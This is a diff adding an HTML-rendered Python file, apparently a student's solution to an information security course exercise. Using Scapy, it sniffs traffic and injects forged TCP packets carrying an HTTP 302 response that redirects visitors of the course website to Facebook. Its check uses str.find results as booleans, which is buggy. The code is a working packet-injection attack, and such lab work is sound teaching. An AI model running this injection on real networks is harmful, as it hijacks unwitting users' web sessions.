@@ -1,0 +1,85 @@
+<html>
+<head>
+<title>q2.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.ln { color: #606366; font-weight: normal; font-style: normal; }
+.s0 { color: rgb(204,120,50); font-weight: bold; }
+.s1 { color: rgb(169,183,198); }
+.s2 { color: rgb(165,194,97); }
+.s3 { color: rgb(204,120,50); }
+.s4 { color: rgb(98,151,85); font-style: italic; }
+.s5 { color: rgb(128,128,128); }
+.s6 { color: rgb(104,151,187); }
+</style>
+</head>
+<BODY BGCOLOR="#2b2b2b">
+<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<TR><TD><CENTER>
+<FONT FACE="Arial, Helvetica" COLOR="#000000">
+q2.py</FONT>
+</center></TD></TR></TABLE>
+<pre>
+<a name="l1"><span class="ln">1    </span></a><span class="s0">import </span><span class="s1">q1 
+<a name="l2"><span class="ln">2    </span></a></span><span class="s0">import </span><span class="s1">scapy.all </span><span class="s0">as </span><span class="s1">S 
+<a name="l3"><span class="ln">3    </span></a> 
+<a name="l4"><span class="ln">4    </span></a> 
+<a name="l5"><span class="ln">5    </span></a>RESPONSE = </span><span class="s2">'</span><span class="s3">\r\n</span><span class="s2">'</span><span class="s1">.join([ 
+<a name="l6"><span class="ln">6    </span></a>    </span><span class="s2">r'HTTP/1.1 302 Found'</span><span class="s3">,</span><span class="s1"> 
+<a name="l7"><span class="ln">7    </span></a>    </span><span class="s2">r'Location: http://www.facebook.com'</span><span class="s3">,</span><span class="s1"> 
+<a name="l8"><span class="ln">8    </span></a>    </span><span class="s2">r''</span><span class="s3">,</span><span class="s1"> 
+<a name="l9"><span class="ln">9    </span></a>    </span><span class="s2">r''</span><span class="s1">]) 
+<a name="l10"><span class="ln">10   </span></a> 
+<a name="l11"><span class="ln">11   </span></a> 
+<a name="l12"><span class="ln">12   </span></a>WEBSITE = </span><span class="s2">'infosec.cs.tau.ac.il'</span><span class="s1"> 
+<a name="l13"><span class="ln">13   </span></a> 
+<a name="l14"><span class="ln">14   </span></a> 
+<a name="l15"><span class="ln">15   </span></a></span><span class="s0">def </span><span class="s1">get_tcp_injection_packet(packet): 
+<a name="l16"><span class="ln">16   </span></a>    </span><span class="s4">&quot;&quot;&quot; 
+<a name="l17"><span class="ln">17   </span></a>    If the given packet is an attempt to access the course website, create a 
+<a name="l18"><span class="ln">18   </span></a>    IP+TCP packet that will redirect the user to Facebook by sending them the 
+<a name="l19"><span class="ln">19   </span></a>    `RESPONSE` from above. 
+<a name="l20"><span class="ln">20   </span></a>    &quot;&quot;&quot;</span><span class="s1"> 
+<a name="l21"><span class="ln">21   </span></a>    packet_str = str(packet) 
+<a name="l22"><span class="ln">22   </span></a>    </span><span class="s0">if </span><span class="s1">packet_str.find(WEBSITE) </span><span class="s0">and </span><span class="s1">packet_str.find(</span><span class="s2">&quot;GET&quot;</span><span class="s1">): 
+<a name="l23"><span class="ln">23   </span></a>        ip = packet.getlayer(S.IP) 
+<a name="l24"><span class="ln">24   </span></a>        tcp = packet.getlayer(S.TCP) 
+<a name="l25"><span class="ln">25   </span></a>        ip_pkt = S.IP(dst=ip.src</span><span class="s3">, </span><span class="s1">src=ip.dst) 
+<a name="l26"><span class="ln">26   </span></a>        </span><span class="s5"># craft a http repsonse packet (contained in ip and tcp layers)</span><span class="s1"> 
+<a name="l27"><span class="ln">27   </span></a>        response_pkt = ip_pkt / S.TCP(dport=ip.sport</span><span class="s3">,</span><span class="s1">sport=ip.dport</span><span class="s3">,</span><span class="s1"> 
+<a name="l28"><span class="ln">28   </span></a>            flags=</span><span class="s2">&quot;AF&quot;</span><span class="s3">, </span><span class="s1">seq=tcp.ack</span><span class="s3">, </span><span class="s1">ack=tcp.seq+</span><span class="s6">1</span><span class="s1">) / S.Raw(load=RESPONSE) 
+<a name="l29"><span class="ln">29   </span></a>        </span><span class="s0">return </span><span class="s1">response_pkt 
+<a name="l30"><span class="ln">30   </span></a> 
+<a name="l31"><span class="ln">31   </span></a></span><span class="s0">def </span><span class="s1">injection_handler(packet): 
+<a name="l32"><span class="ln">32   </span></a>    </span><span class="s5"># WARNING: DO NOT EDIT THIS FUNCTION!</span><span class="s1"> 
+<a name="l33"><span class="ln">33   </span></a>    to_inject = get_tcp_injection_packet(packet) 
+<a name="l34"><span class="ln">34   </span></a>    </span><span class="s0">if </span><span class="s1">to_inject: 
+<a name="l35"><span class="ln">35   </span></a>        S.send(to_inject) 
+<a name="l36"><span class="ln">36   </span></a>        </span><span class="s0">return </span><span class="s2">'Injection triggered!'</span><span class="s1"> 
+<a name="l37"><span class="ln">37   </span></a> 
+<a name="l38"><span class="ln">38   </span></a> 
+<a name="l39"><span class="ln">39   </span></a></span><span class="s0">def </span><span class="s1">packet_filter(packet): 
+<a name="l40"><span class="ln">40   </span></a>    </span><span class="s5"># WARNING: DO NOT EDIT THIS FUNCTION!</span><span class="s1"> 
+<a name="l41"><span class="ln">41   </span></a>    </span><span class="s0">return </span><span class="s1">q1.packet_filter(packet) 
+<a name="l42"><span class="ln">42   </span></a> 
+<a name="l43"><span class="ln">43   </span></a> 
+<a name="l44"><span class="ln">44   </span></a></span><span class="s0">def </span><span class="s1">main(args): 
+<a name="l45"><span class="ln">45   </span></a>    </span><span class="s5"># WARNING: DO NOT EDIT THIS FUNCTION!</span><span class="s1"> 
+<a name="l46"><span class="ln">46   </span></a> 
+<a name="l47"><span class="ln">47   </span></a>    </span><span class="s0">if </span><span class="s2">'--help' </span><span class="s0">in </span><span class="s1">args </span><span class="s0">or </span><span class="s1">len(args) &gt; </span><span class="s6">1</span><span class="s1">: 
+<a name="l48"><span class="ln">48   </span></a>        </span><span class="s0">print </span><span class="s2">'Usage: %s' </span><span class="s1">% args[</span><span class="s6">0</span><span class="s1">] 
+<a name="l49"><span class="ln">49   </span></a>        </span><span class="s0">return</span><span class="s1"> 
+<a name="l50"><span class="ln">50   </span></a> 
+<a name="l51"><span class="ln">51   </span></a>    </span><span class="s5"># Allow Scapy to really inject raw packets</span><span class="s1"> 
+<a name="l52"><span class="ln">52   </span></a>    S.conf.L3socket = S.L3RawSocket 
+<a name="l53"><span class="ln">53   </span></a> 
+<a name="l54"><span class="ln">54   </span></a>    </span><span class="s5"># Now sniff and wait for injection opportunities.</span><span class="s1"> 
+<a name="l55"><span class="ln">55   </span></a>    S.sniff(lfilter=packet_filter</span><span class="s3">, </span><span class="s1">prn=injection_handler) 
+<a name="l56"><span class="ln">56   </span></a> 
+<a name="l57"><span class="ln">57   </span></a> 
+<a name="l58"><span class="ln">58   </span></a></span><span class="s0">if </span><span class="s1">__name__ == </span><span class="s2">'__main__'</span><span class="s1">: 
+<a name="l59"><span class="ln">59   </span></a>    </span><span class="s0">import </span><span class="s1">sys 
+<a name="l60"><span class="ln">60   </span></a>    main(sys.argv) 
+<a name="l61"><span class="ln">61   </span></a></span></pre>
+</body>
+</html>
